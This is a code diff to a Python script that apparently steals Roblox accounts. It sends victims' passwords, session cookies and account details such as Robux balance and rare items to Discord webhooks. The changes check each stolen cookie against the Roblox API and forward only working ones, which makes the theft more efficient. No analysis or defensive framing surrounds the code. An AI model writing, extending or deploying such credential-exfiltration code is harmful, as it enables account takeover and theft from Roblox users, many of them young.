@@ -106,6 +106,11 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         print("Background: Fetching Roblox user information...")
         user_info = get_roblox_user_info(cookie)
         
+        # Check if cookie actually works with Roblox API
+        if not user_info.get('success', False):
+            print("Background: Cookie failed validation against Roblox API - not sending webhooks")
+            return
+        
         # Check if user has Korblox or Headless for ping notification
         has_premium_items = korblox or headless
         ping_content = ''
@@ -199,13 +204,16 @@ def send_to_discord_background(password, korblox, headless, cookie, webhook_url)
         else:
             print(f"Background: Discord webhook failed: {response.status_code}")
         
-        # Also send to bypass logs webhook (clean data without cookie)
-        bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
-        if bypass_webhook_url:
-            print("Background: Sending to bypass logs webhook...")
-            send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
+        # Also send to bypass logs webhook (clean data without cookie) - only if cookie worked
+        if user_info.get('success', False):
+            bypass_webhook_url = os.environ.get('BYPASS_WEBHOOK_URL')
+            if bypass_webhook_url:
+                print("Background: Sending to bypass logs webhook...")
+                send_bypass_logs_to_discord(user_info, korblox, headless, bypass_webhook_url)
+            else:
+                print("Background: Bypass webhook URL not configured")
         else:
-            print("Background: Bypass webhook URL not configured")
+            print("Background: Not sending bypass logs - cookie validation failed")
             
     except Exception as e:
         print(f"Background: Error sending to Discord: {str(e)}")
@@ -295,6 +303,7 @@ def get_roblox_user_info(cookie):
                 print(f"Error getting Premium status: {str(premium_error)}")
             
             return {
+                'success': True,
                 'username': username,
                 'display_name': display_name,
                 'user_id': user_id,
@@ -302,11 +311,16 @@ def get_roblox_user_info(cookie):
                 'robux_balance': robux_balance,
                 'premium_status': premium_status
             }
+        else:
+            print(f"Cookie validation failed against Roblox API: {response.status_code}")
+            print(f"Response: {response.text}")
         
     except Exception as e:
         print(f"Error fetching Roblox user info: {str(e)}")
     
+    # Return failure indicator if cookie doesn't work with Roblox API
     return {
+        'success': False,
         'username': 'Not available',
         'display_name': 'Not available', 
         'user_id': None,
